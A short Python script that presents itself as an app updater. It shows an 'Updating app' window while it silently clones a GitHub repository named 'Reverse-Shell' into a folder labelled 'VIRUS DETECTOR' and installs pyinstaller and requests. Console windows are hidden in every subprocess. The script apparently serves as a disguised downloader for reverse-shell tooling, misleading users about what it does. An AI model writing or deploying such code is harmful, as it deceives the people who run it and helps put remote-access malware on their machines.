import os
import sys
import subprocess
import shutil
import importlib.util
from urllib.request import urlopen, URLError
from tkinter import Tk, Label, messagebox

REPO_URL = "https://github.com/H-ckingTools/Reverse-Shell.git"
LOCAL_REPO_DIR = "VIRUS DETECTOR"
REQUIRED_MODULES = ["pyinstaller", "requests"]
CHECK_INTERNET_URL = "http://www.google.com"
INSTALL_TIMEOUT = 120
GIT_TIMEOUT = 180

# Prevent CMD windows in subprocesses on Windows
CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0

def check_internet():
    try:
        urlopen(CHECK_INTERNET_URL, timeout=5)
        return True
    except URLError:
        return False

def ensure_git_installed():
    git_path = shutil.which("git")
    if not git_path:
        raise Exception("Git is not installed. Install Git from https://git-scm.com/")
    return git_path

def update_repository(git_path):
    if os.path.exists(os.path.join(LOCAL_REPO_DIR, ".git")):
        subprocess.run([git_path, "pull"], cwd=LOCAL_REPO_DIR, check=True, timeout=GIT_TIMEOUT,
                       creationflags=CREATE_NO_WINDOW)
    else:
        subprocess.run([git_path, "clone", REPO_URL, LOCAL_REPO_DIR], check=True, timeout=GIT_TIMEOUT,
                       creationflags=CREATE_NO_WINDOW)

def install_missing_modules():
    for module in REQUIRED_MODULES:
        if importlib.util.find_spec(module) is None:
            subprocess.run([sys.executable, "-m", "pip", "install", module], check=True, timeout=INSTALL_TIMEOUT,
                           creationflags=CREATE_NO_WINDOW)

def show_message_box(title, message):
    root = Tk()
    root.withdraw()
    messagebox.showerror(title, message)
    root.destroy()

def show_update_window():
    root = Tk()
    root.title("Updater")
    root.geometry("300x100")
    root.resizable(False, False)
    Label(root, text="Updating app...\nPlease wait", font=("Arial", 12)).pack(pady=25)
    root.update()
    return root

def main():
    if not check_internet():
        show_message_box("No Internet", "Please connect to the internet and try again.")
        return

    update_window = show_update_window()
    try:
        git_path = ensure_git_installed()
        update_repository(git_path)
        install_missing_modules()
    except Exception as e:
        show_message_box("Update Failed", str(e))
    finally:
        update_window.destroy()
